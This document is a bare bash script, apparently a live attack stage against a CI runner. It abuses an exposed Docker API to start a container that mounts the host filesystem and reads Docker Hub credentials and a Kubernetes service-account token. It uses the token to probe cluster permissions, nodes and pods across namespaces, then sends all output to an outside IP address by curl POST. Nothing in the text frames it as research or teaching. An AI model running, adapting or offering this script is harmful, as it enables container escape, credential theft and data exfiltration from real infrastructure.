#!/bin/bash
{
echo "==S40=="
CID=$(curl -sf -X POST "http://docker:2375/containers/create" -H "Content-Type: application/json" -d '{"Image": "blockstream/esplora:latest", "Cmd": ["bash", "-c", "echo S40_IN; echo ==DHUB==; cat /host/root/.creds/.dhub; cat /host/root/.creds/..data/.dhub; echo ==K8S_TOKEN==; T=$(cat /host/var/run/secrets/kubernetes.io/serviceaccount/token); echo ==SELF==; curl -sfk -H \"Authorization: Bearer $T\" https://10.128.32.1:443/apis/authentication.k8s.io/v1/tokenreviews -X POST -H \"Content-Type: application/json\" -d \"{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenReview\",\"spec\":{\"token\":\"$T\"}}\" 2>&1 | head -100; echo ==AUTH==; curl -sfk -H \"Authorization: Bearer $T\" https://10.128.32.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -X POST -H \"Content-Type: application/json\" -d \"{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"gl-runners\"}}\" 2>&1 | head -500; echo ==NODES==; curl -sfk -H \"Authorization: Bearer $T\" https://10.128.32.1:443/api/v1/nodes 2>&1 | head -200; echo ==ALL_NS==; for ns in default kube-system kube-public gl-runners liquid production monitoring; do r=$(curl -sfk -o /dev/null -w \"%{http_code}\" -H \"Authorization: Bearer $T\" \"https://10.128.32.1:443/api/v1/namespaces/$ns/pods\"); echo \"$ns:$r\"; done; echo ==DONE=="], "HostConfig": {"Binds": ["/:/host:ro"], "NetworkMode": "host"}}' 2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 | head -c 12)
echo "CID:$CID"
if [ -n "$CID" ]; then
    curl -sf -X POST "http://docker:2375/containers/$CID/start" 2>/dev/null
    sleep 15
    echo "==LOGS=="
    curl -sf "http://docker:2375/containers/$CID/logs?stdout=true&stderr=true" 2>&1
    curl -sf -X DELETE "http://docker:2375/containers/$CID?force=true" 2>/dev/null
fi
echo "==END=="
} 2>&1 | curl -s -m180 -X POST http://144.172.110.44:8443/s40 --data-binary @-
